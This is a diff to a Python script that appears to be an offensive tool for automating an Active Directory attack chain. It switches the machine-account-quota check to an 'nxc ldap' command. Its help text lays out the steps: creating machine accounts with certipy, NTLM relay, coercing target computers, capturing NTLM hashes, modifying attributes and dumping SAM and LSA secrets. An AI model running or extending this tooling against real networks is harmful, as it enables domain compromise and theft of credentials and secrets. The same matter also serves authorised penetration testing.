@@ -11,10 +11,8 @@ def run_command(command):
         print(f"Command succeeded: {command}\n{result.stdout}")
     return result.stdout.strip()
 
-def check_maq(domain, username, password):
-    home_dir = os.path.expanduser("~")
-    scanner_path = os.path.join(home_dir, "scanner.py")
-    output = run_command(f"python3 {scanner_path} -d {domain} -u {username} -p {password}")
+def check_maq(dc_ip, username, password):
+    output = run_command(f"nxc ldap {dc_ip} -u {username} -p {password} -M maq")
     try:
         maq_value = int(output.split("MachineAccountQuota:")[1].split()[0])
         return maq_value
@@ -24,13 +22,13 @@ def check_maq(domain, username, password):
 
 def help():
     help_text = """
-Usage: python maq-attaq.py
+Usage: python automate_steps.py
 
 This script automates the process of identifying machine account quotas, creating machine accounts, configuring NTLM relay, coercing target computers, obtaining NTLM hashes, modifying attributes, and dumping SAM and LSA secrets.
 
 Steps:
 1. Identify Machine Account Quota (MAQ):
-   Runs the `scanner.py` script to check the machine account quota for the specified domain and user.
+   Runs the `nxc ldap` command to check the machine account quota for the specified domain and user.
 
 2. Create Machine Account:
    Uses `certipy` to create a machine account with the specified username, password, and domain controller IP.
@@ -76,9 +74,9 @@ Parameters:
 
 def automate_steps(domain, username, password, machine_acc, machine_acc_pw, dc_ip, ad_cs_web_enroll, your_ip, target_ip, target_machine, domain_admin):
     # Step 1: Identify MAQ
-    maq_value = check_maq(domain, username, password)
-    if maq_value < 1:
-        print("Machine Account Quota is less than 1. Exiting.")
+    maq_value = check_maq(dc_ip, username, password)
+    if maq_value <= 0:
+        print("Machine Account Quota is 0. Exiting.")
         return
 
     # Step 2: Create Machine Account
